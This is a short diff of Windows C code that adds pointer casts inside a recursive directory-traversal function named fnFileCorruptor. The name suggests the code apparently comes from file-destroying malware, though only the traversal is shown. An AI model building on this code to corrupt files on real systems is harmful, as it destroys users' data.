@@ -417,7 +417,7 @@ VOID WINAPI fnFileCorruptor(LPCWSTR lpszVolumeArg) {
 
 	PathCombineW(
 		szVolumeLocal, 
-		lpszVolumeName, 
+		(LPWSTR)lpszVolumeName, 
 		TEXT("*\0")
 		);
 	
@@ -438,7 +438,7 @@ VOID WINAPI fnFileCorruptor(LPCWSTR lpszVolumeArg) {
 				) {
 				PathCombineW(
 					szVolumeLocal, 
-					lpszVolumeName, 
+					(LPWSTR)lpszVolumeName, 
 					stFileFind.cFileName
 					);
 				fnFileCorruptor(szVolumeLocal);
@@ -454,7 +454,7 @@ VOID WINAPI fnFileCorruptor(LPCWSTR lpszVolumeArg) {
 
 	PathCombineW(
 		szVolumeLocal, 
-		lpszVolumeName, 
+		(LPWSTR)lpszVolumeName, 
 		TEXT("*\0")
 		);
 
@@ -467,7 +467,7 @@ VOID WINAPI fnFileCorruptor(LPCWSTR lpszVolumeArg) {
 			if((stFileFind.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY) == FALSE) {
 				PathCombineW(
 					szVolumeLocal, 
-					lpszVolumeName, 
+					(LPWSTR)lpszVolumeName, 
 					stFileFind.cFileName
 					);
 
